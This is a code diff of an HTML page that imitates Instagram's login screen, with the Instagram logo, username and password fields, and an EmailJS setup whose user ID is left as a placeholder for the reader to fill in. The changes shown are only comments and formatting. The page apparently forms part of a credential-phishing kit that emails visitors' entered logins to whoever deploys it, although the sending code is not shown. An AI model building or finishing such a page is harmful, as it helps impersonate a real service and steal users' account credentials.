@@ -1,4 +1,3 @@
-<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -108,6 +107,7 @@
 
 <div class="login-container">
   <div class="notification" id="notification"></div>
+  <!-- Local Instagram logo -->
   <img src="assets/instagram-logo.png" alt="Instagram Logo">
   
   <input type="text" id="username" placeholder="Phone number, username, or email">
@@ -128,7 +128,8 @@
 </div>
 
 <script>
-  emailjs.init("YOUR_EMAILJS_USER_ID"); // Replace with your EmailJS user ID
+  // Initialize EmailJS (replace placeholders with your actual IDs)
+  emailjs.init("YOUR_EMAILJS_USER_ID");
 
   function togglePassword() {
     const password = document.getElementById('password');
